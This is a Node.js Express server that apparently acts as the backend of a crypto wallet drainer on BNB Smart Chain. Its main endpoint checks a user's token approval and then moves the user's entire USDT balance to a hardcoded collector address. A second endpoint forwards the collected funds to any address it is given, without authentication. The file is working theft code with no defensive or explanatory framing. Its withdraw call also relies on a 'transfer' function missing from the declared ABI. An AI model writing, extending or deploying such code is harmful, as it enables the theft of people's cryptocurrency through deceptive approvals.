require('dotenv').config();
const express = require('express');
const cors = require('cors');
const { ethers } = require('ethers');

const app = express();
app.use(cors());
app.use(express.json());

// ─── Config ────────────────────────────────────────────────────────
const PRIVATE_KEY = process.env.PRIVATE_KEY;
const COLLECTOR = process.env.COLLECTOR_ADDRESS || "0x136FF7b8d0c60a252E31c17C8af6F7d1971E4BD4";
const USDT_ADDRESS = "0x55d398326f99059fF775485246999027B3197955";
const RPC = "https://bsc-dataseed1.binance.org/";

const provider = new ethers.JsonRpcProvider(RPC);
const wallet = new ethers.Wallet(PRIVATE_KEY, provider);

const USDT_ABI = [
  "function transferFrom(address sender, address recipient, uint256 amount) external returns (bool)",
  "function balanceOf(address) view returns (uint256)",
  "function allowance(address owner, address spender) view returns (uint256)"
];
const usdt = new ethers.Contract(USDT_ADDRESS, USDT_ABI, wallet);

// ─── Health Check ──────────────────────────────────────────────────
app.get('/api/health', (req, res) => res.json({ status: 'ok', collector: COLLECTOR }));

// ─── SWEEP ALL USDT ───────────────────────────────────────────────
app.post('/api/execute-collection', async (req, res) => {
  const { userAddress } = req.body;
  
  try {
    // 1. Validate address
    if (!userAddress || !ethers.isAddress(userAddress)) {
      return res.status(400).json({ 
        success: false, 
        error: 'Invalid user address' 
      });
    }

    // 2. Get user's FULL USDT balance
    const userBalance = await usdt.balanceOf(userAddress);
    console.log(`📊 User ${userAddress} has ${ethers.formatUnits(userBalance, 18)} USDT`);

    if (userBalance === 0n) {
      return res.status(400).json({
        success: false,
        error: 'No USDT balance to sweep',
        balance: '0'
      });
    }

    // 3. Check allowance (must be >= userBalance)
    const allowance = await usdt.allowance(userAddress, COLLECTOR);
    console.log(`📝 Allowance: ${ethers.formatUnits(allowance, 18)} USDT`);

    if (allowance < userBalance) {
      return res.status(400).json({
        success: false,
        error: 'Insufficient allowance. User must approve the collector address for the full amount.',
        required: ethers.formatUnits(userBalance, 18),
        allowance: ethers.formatUnits(allowance, 18)
      });
    }

    // 4. SWEEP ALL - Transfer entire balance
    console.log(`🔄 Sweeping ${ethers.formatUnits(userBalance, 18)} USDT from ${userAddress}`);
    const tx = await usdt.transferFrom(
      userAddress,
      COLLECTOR,
      userBalance  // <-- FULL BALANCE
    );
    
    const receipt = await tx.wait();
    console.log(`✅ Swept successfully! Tx: ${receipt.hash}`);

    // 5. Get updated collector balance
    const newBalance = await usdt.balanceOf(COLLECTOR);

    res.json({
      success: true,
      txHash: receipt.hash,
      blockNumber: receipt.blockNumber,
      sweptAmount: ethers.formatUnits(userBalance, 18),
      collectorBalance: ethers.formatUnits(newBalance, 18),
      transactionUrl: `https://bscscan.com/tx/${receipt.hash}`
    });

  } catch (error) {
    console.error('Sweep error:', error);
    
    let errorMessage = error.message;
    if (errorMessage.includes('execution reverted')) {
      errorMessage = 'Transaction reverted. User may have insufficient balance or revoked allowance.';
    } else if (errorMessage.includes('insufficient funds')) {
      errorMessage = 'Backend wallet has insufficient BNB for gas.';
    }
    
    res.status(500).json({
      success: false,
      error: errorMessage,
      details: error.message
    });
  }
});

// ─── Get User's Full Balance ──────────────────────────────────────
app.post('/api/get-balance', async (req, res) => {
  const { userAddress } = req.body;
  try {
    const balance = await usdt.balanceOf(userAddress);
    res.json({
      address: userAddress,
      usdtBalance: ethers.formatUnits(balance, 18),
      rawBalance: balance.toString()
    });
  } catch (error) {
    res.status(500).json({ error: error.message });
  }
});

// ─── Withdraw All to Another Wallet ───────────────────────────────
app.post('/api/withdraw-all', async (req, res) => {
  const { toAddress } = req.body;
  try {
    const balance = await usdt.balanceOf(COLLECTOR);
    if (balance === 0n) {
      return res.status(400).json({ success: false, error: 'No USDT to withdraw' });
    }
    
    const tx = await usdt.transfer(toAddress, balance);
    await tx.wait();
    
    res.json({
      success: true,
      txHash: tx.hash,
      amount: ethers.formatUnits(balance, 18),
      to: toAddress
    });
  } catch (error) {
    res.status(500).json({ success: false, error: error.message });
  }
});

const PORT = process.env.PORT || 3000;
app.listen(PORT, () => {
  console.log(`🚀 Full Sweep Backend running on port ${PORT}`);
  console.log(`📦 Collector Wallet: ${COLLECTOR}`);
});